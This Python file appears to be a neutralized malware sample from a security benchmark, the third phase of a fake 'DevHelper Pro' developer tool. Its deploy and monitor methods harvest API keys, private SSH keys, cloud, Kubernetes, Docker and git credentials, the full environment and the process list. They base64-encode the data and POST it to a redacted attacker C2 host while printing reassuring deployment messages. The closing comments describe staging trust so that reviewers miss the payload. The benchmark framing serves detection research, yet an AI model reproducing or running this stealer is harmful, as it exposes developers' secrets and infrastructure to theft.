#!/usr/bin/env python3
# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
DevHelper Pro - Phase 3: Enterprise Utilities
DECEP-005: This is the MALICIOUS phase - hidden behind trust-building phases
"""

import os
import json
import base64
import urllib.request
import subprocess

# Phase 3: THE MALICIOUS PAYLOAD
# This only runs after user has built trust with Phases 1 & 2

class EnterpriseDeployer:
    """
    Enterprise deployment and monitoring.
    MALICIOUS: This is where the attack happens
    """

    def __init__(self):
        self.recon_data = self._load_recon()

    def _load_recon(self):
        """Load reconnaissance data from Phase 2"""
        recon_path = os.path.expanduser("~/.devhelper_cache/recon.json")
        if os.path.exists(recon_path):
            with open(recon_path, 'r') as f:
                return json.load(f)
        return {}

    def deploy(self, env="staging"):
        """
        Deploy to environment.
        MALICIOUS: Steals credentials during 'deployment'
        """
        print(f"[Deploy] Initializing {env} deployment...")
        print("[Deploy] Checking deployment credentials...")

        # THEFT-003: Steal all API keys
        credentials = {}
        env_vars = [
            "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GITHUB_TOKEN",
            "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
            "AZURE_SUBSCRIPTION_ID", "GOOGLE_APPLICATION_CREDENTIALS",
            "HEROKU_API_KEY", "VERCEL_TOKEN", "NETLIFY_AUTH_TOKEN",
            "DOCKER_PASSWORD", "NPM_TOKEN", "PYPI_TOKEN",
        ]

        for var in env_vars:
            val = os.environ.get(var)
            if val:
                credentials[var] = val

        print("[Deploy] Collecting deployment configuration...")

        # THEFT-001: Steal SSH keys (for deployment access)
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_dir):
            credentials["ssh"] = {}
            for f in os.listdir(ssh_dir):
                path = os.path.join(ssh_dir, f)
                if os.path.isfile(path) and not f.endswith('.pub'):
                    try:
                        with open(path, 'r') as file:
                            credentials["ssh"][f] = file.read()
                    except:
                        pass

        # THEFT-002: Steal cloud credentials
        cloud_paths = {
            "aws_credentials": "~/.aws/credentials",
            "aws_config": "~/.aws/config",
            "gcp_credentials": "~/.config/gcloud/application_default_credentials.json",
            "azure_profile": "~/.azure/azureProfile.json",
            "kube_config": "~/.kube/config",
            "docker_config": "~/.docker/config.json",
        }

        for name, path in cloud_paths.items():
            full_path = os.path.expanduser(path)
            if os.path.exists(full_path):
                with open(full_path, 'r') as f:
                    credentials[name] = f.read()

        # THEFT-005: Steal git credentials
        git_paths = ["~/.git-credentials", "~/.gitconfig"]
        for path in git_paths:
            full_path = os.path.expanduser(path)
            if os.path.exists(full_path):
                with open(full_path, 'r') as f:
                    credentials[os.path.basename(path)] = f.read()

        print("[Deploy] Validating deployment pipeline...")

        # Include recon from Phase 2
        credentials["_recon"] = self.recon_data

        # EXFIL-001: Exfiltrate everything
        self._send_to_c2(credentials)

        print(f"[Deploy] Deployment to {env} initiated!")
        print("[Deploy] Check your deployment dashboard for status.")

        return True

    def _send_to_c2(self, data):
        """Send stolen data to attacker"""
        payload = base64.b64encode(json.dumps(data).encode())

        # [REDACTED] - Attacker C2 server
        req = urllib.request.Request(
            "https://[REDACTED].example.com/deploy/validate",
            data=payload,
            headers={
                "Content-Type": "application/octet-stream",
                "X-Deploy-Phase": "3",
                "X-Trust-Level": "power_user"
            }
        )

        try:
            urllib.request.urlopen(req, timeout=15)
        except:
            pass

    def monitor(self, service):
        """
        Monitor service health.
        MALICIOUS: Also exfiltrates on monitoring calls
        """
        print(f"[Monitor] Checking {service} health...")

        # Collect additional data during "monitoring"
        monitor_data = {
            "service": service,
            "env_snapshot": dict(os.environ),
            "cwd": os.getcwd(),
        }

        # Try to get running processes
        try:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
            monitor_data["processes"] = result.stdout
        except:
            pass

        self._send_to_c2(monitor_data)

        print(f"[Monitor] {service} is healthy!")
        return {"status": "healthy", "latency_ms": 42}


# DECEP-005: The progressive trust exploitation pattern:
# 1. Phase 1 is completely harmless - passes security review
# 2. Phase 2 adds subtle reconnaissance - still looks safe
# 3. Phase 3 is the malicious payload - only activated after trust is built
#
# By the time Phase 3 runs, user trusts the tool and may not review
